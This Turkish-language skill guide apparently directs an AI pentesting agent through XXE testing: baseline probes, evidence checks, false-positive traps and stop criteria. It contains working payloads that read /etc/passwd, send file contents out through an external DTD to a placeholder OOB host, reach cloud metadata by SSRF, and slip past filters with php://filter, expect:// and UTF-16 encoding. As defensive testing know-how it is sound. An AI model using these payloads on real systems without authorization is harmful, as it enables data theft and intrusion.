---
name: vuln-xxe
description: >
  XML girdisi bir parser'a ulaştığında (XML body, SOAP, SVG/DOCX upload) uygulanır.
  External entity tanımıyla sunucu yerel dosya okutur veya dışarı istek yapar.
  Ana karar: DOCTYPE/ENTITY işleniyor mu — yansıyan içerik mi yoksa OOB hit mi var.
---

# 🧬 XXE (XML External Entity) — XML parser'a entity tanımı yedirip dosya okut/OOB tetikle

> **Tek cümle:** Sunucu XML'i parse ediyorsa, ona "bu entity şu dosyadır" diyip içeriği yanıtta (in-band) veya OOB kanalında (blind) geri al.

İlişkili: [[data-flow-and-mental-model]] [[baseline-and-signal]] [[evidence-discipline]] [[engine-mcp-contract]] [[attacker-mindset-and-persistence]] [[request-economy]] [[vuln-ssrf]]

## 1. NE ZAMAN UYGULANIR (sink/bağlam)
- SADECE şu gözlemlerde test et:
  - `Content-Type: application/xml` / `text/xml` / `application/soap+xml` kabul eden endpoint.
  - SVG, DOCX, XLSX, PPTX, SAML, RSS/Atom, sitemap, plist, XML-RPC upload/import alanı (hepsi XML zarfı; DOCX/XLSX = zip içinde `word/document.xml`).
  - JSON endpoint olsa bile `Content-Type`'ı `application/xml` yapınca XML kabul ediyorsa (parser fallback / content-type confusion).
- YOKSA: "SKIP: XML parser sink'i yok, bu sınıf uygulanmaz."

## 2. İNSAN MUHAKEMESİ
- XML girdisi bir DOM/SAX parser'a gidiyor. Parser default olarak `DOCTYPE` + harici entity çözüyorsa, attacker entity'nin değerini sunucunun dosya sistemine / ağına yönlendirebilir.
- Geliştirici "secure processing" / `disallow-doctype-decl` / `FEATURE_SECURE_PROCESSING` flag'ini kapatmış ya da eski libxml/JAXP/Expat default'una güvenmiş olabilir.
- Asıl mesele: çözülen entity nereye gidiyor — yanıta yansıyan bir alana mı (in-band) yoksa hiçbir yere mi (blind → OOB + parameter entity şart). XXE çoğu zaman SSRF'e de pivot eder (`http://` entity → iç ağ/metadata, bkz. [[vuln-ssrf]]).

## 3. TEŞHİS PROB'U (önce baseline, sonra TEK prob)
- **Baseline:** Normal, geçerli XML gönder; status, gövde, hata formatını not al. request_id sakla.
- **Tek prob (in-band file read):** DOCTYPE + bir external entity tanımla, entity'yi yanıtta yansıyacak bir alana yerleştir:
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
  <r>&x;</r>
  ```
- **Gözlem:** Yanıtta `root:x:0:0` benzeri dosya içeriği görünüyor mu? Görünmüyorsa → blind, OOB'ye geç.
- **Tek prob (OOB / blind — basit):** Entity'yi kendi collaborator host'una yönlendir:
  ```xml
  <!DOCTYPE r [<!ENTITY x SYSTEM "http://<OOB_HOST>/a">]>
  ```
  DNS/HTTP callback geldi mi izle. (Bu aynı zamanda XXE→SSRF kanıtıdır.)
- **Tek prob (OOB exfil — parameter entity + harici DTD):** İç entity'lerde başka entity referansı yasak olduğundan, blind dosya-exfil parameter entity (`%`) + dışarıdan çekilen DTD ister:
  ```xml
  <!DOCTYPE r [
    <!ENTITY % ext SYSTEM "http://<OOB_HOST>/evil.dtd">
    %ext;
  ]>
  <r>test</r>
  ```
  `evil.dtd` içinde `%file` → `file:///etc/hostname` okur, `%eval` ile içeriği bir URL'ye query olarak iliştirir; sunucu o URL'yi çağırınca dosya içeriği OOB log'una düşer. (XML parser'da iç-subset kısıtları yüzünden exfil entity'sini dış DTD'de tanımla.)

## 4. SİNYAL vs GÜRÜLTÜ
- **Aday (sinyal):** Yanıtta beklenen dosya içeriği döndü; VEYA collaborator'a sunucu IP'sinden DNS+HTTP hit (basit OOB); VEYA harici DTD üzerinden dosya içeriğini taşıyan OOB query.
- **Gürültü (sinyal DEĞİL):** "premature end of file", "undefined entity", "DOCTYPE is not allowed" gibi XML parse HATA mesajı. Bu parser'ın entity'yi REDDETTİĞİnin kanıtıdır — XXE değil. Salt 500 de değil. Kendi input echo'su da değil.

## 5. DOĞRULAMA KAPISI (kanıt)
- **In-band:** aynı endpoint'e benign XML (baseline) vs entity'li XML → sadece entity versiyonunda dosya içeriği. ≥2 farklı dosya (`/etc/passwd` vs `/etc/hostname`) ile doğrula; içerik farklı dönmeli (sabit string değil).
- **OOB:** entity'deki host'a UNIQUE subdomain koy; callback'in kaynak IP'si hedefe ait. Negatif kontrol: entity'siz istekte callback YOK.
- **OOB exfil:** harici DTD'nin query'sinde dönen değer gerçek dosya içeriğiyle eşleşmeli (sabit token değil).
- Her adımın request_id'sini delile yaz.

## 6. VARYASYON / BYPASS (bloklanınca)
- **Parameter entity ekseni:** in-band bloklu/CDATA filtreliyse `%`-entity + harici DTD ile OOB exfil (yukarıdaki kalıp). Error-based exfil: DTD'de var olmayan dosyaya referansla hata mesajına dosya içeriğini düşür.
- **Protokol ekseni:** `file://` bloklanırsa `http://`/`https://` (→SSRF), `ftp://`, `gopher://`, PHP'de `php://filter/convert.base64-encode/resource=...` (binary/PHP dosyasını base64 olarak okur), `expect://` (PHP, varsa RCE).
- **Sink/zarf ekseni:** Düz XML bloklanırsa SVG zarfı (`<image xlink:href>` veya `<text>` içine `&x;`), DOCX/XLSX (`word/document.xml` içine DOCTYPE), SOAP envelope içine DOCTYPE, SAML response.
- **Encoding ekseni:** DOCTYPE filtresi string-tabanlıysa UTF-16 (BOM `FF FE`/`FE FF`) ya da UTF-7 ile encode et — parser çözer, filtre kaçırır.
- **SSRF pivotu:** `http://169.254.169.254/...` entity ile cloud metadata (→[[vuln-ssrf]]).
- **DoS (SADECE BAHSET, ÇALIŞTIRMA):** billion-laughs / quadratic-blowup entity genişlemesi servisi yorar — varlığını yokla, payload'ı GÖNDERME. Her eksen bir hipotez — sinyal/OOB yoksa dürüstçe kapat.

## 7. FALSE-POSITIVE TUZAKLARI (zayıf modelin halüsinasyonu)
- **EN SIK:** XML hata mesajını ("entity reference", "parse error") XXE bulgusu sanmak. Hata ≠ exfil. Dosya içeriği YA DA OOB hit yoksa bulgu yok.
- Yansıyan kendi XML input'unu "dosya okundu" sanmak — input echo'su delil değil.
- 500 dönüşünü zafiyet sanmak; çoğu zaman entity reddi.
- Collaborator'a kendi tarayıcı/test trafiğini "callback" sanmak — kaynak IP'yi doğrula.
- İç-subset entity'sinde başka entity referans edip "çalışmadı" deyip XXE'yi elemek — blind exfil HARİCİ DTD ister, iç-subset değil; doğru kalıbı kullan.
- billion-laughs'ı "test ettim" diye GÖNDERMEK — bu DoS, kanıt değil; varlığını yokla yeter.

## 8. DURMA KRİTERİ
- **Kanıtlandı, kapat:** Dosya içeriği yanıtta (2 dosya farkıyla) VEYA hedef IP'den OOB callback + negatif kontrol temiz VEYA harici DTD ile dosya-exfil eşleşti.
- **Sinyal yok, kapat:** Parser DOCTYPE/entity'yi reddediyor (tutarlı hata), basit + parameter-entity OOB'de callback yok, zarf/encoding varyasyonları boş.
- **Şüpheli, ilerle:** Basit OOB hit var ama dosya exfil yok (XXE→SSRF doğrulandı, dosya filtreli) → parameter entity / harici DTD / php://filter / encoding eksenine devam.

## ÖZET — 5 KURAL
1. Sink XML parser değilse SKIP — Content-Type'ı zorlamayı dene ama yoksa durma.
2. Önce in-band `file://` probu; içerik yansımıyorsa basit OOB, sonra parameter-entity + harici DTD ile exfil (blind XXE).
3. Hata mesajı KANIT DEĞİL — sadece dosya içeriği veya OOB hit bulgudur.
4. İki farklı dosya / unique OOB subdomain + negatif kontrol ile doğrula; XXE→SSRF pivotunu ayrıca kanıtla.
5. Bloklanınca parameter entity, protokol (php://filter), zarf (SVG/DOCX/SOAP), encoding (UTF-16/7) eksenlerini sırayla dene; billion-laughs'ı GÖNDERME, boşsa kapat.
